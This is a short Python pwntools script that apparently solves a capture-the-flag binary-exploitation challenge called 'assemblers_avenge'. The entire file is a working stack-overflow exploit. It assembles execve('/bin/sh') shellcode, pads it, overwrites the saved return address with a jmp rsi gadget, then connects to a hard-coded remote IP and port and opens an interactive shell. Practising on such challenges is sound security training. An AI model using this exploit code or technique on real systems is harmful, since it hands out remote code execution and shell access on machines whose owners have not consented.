#!/usr/bin/env python3
from pwn import *

context.arch     = 'amd64'
context.log_level= 'info'

HOST, PORT      = '83.136.255.10', 42107
elf             = ELF('./assemblers_avenge')

jmp_rsi         = 0x40106b
binsh           = next(elf.search(b'/bin/sh\x00'))

sc = asm(f'''
    xor    rsi, rsi
    xor    rdx, rdx
    mov    al, 0x3b
    mov    edi, {binsh}
    syscall
''')

# now pack it into the 24‑byte window:
payload  = sc
payload += b'A' * (16 - len(sc))   # pad out to offset 16
payload += p64(jmp_rsi)            # goes into saved RIP (bytes 16–23)

assert len(payload) == 0x18        # exactly the 24‑byte read size

# fire off
p = remote(HOST, PORT)
p.send(payload)
p.interactive()
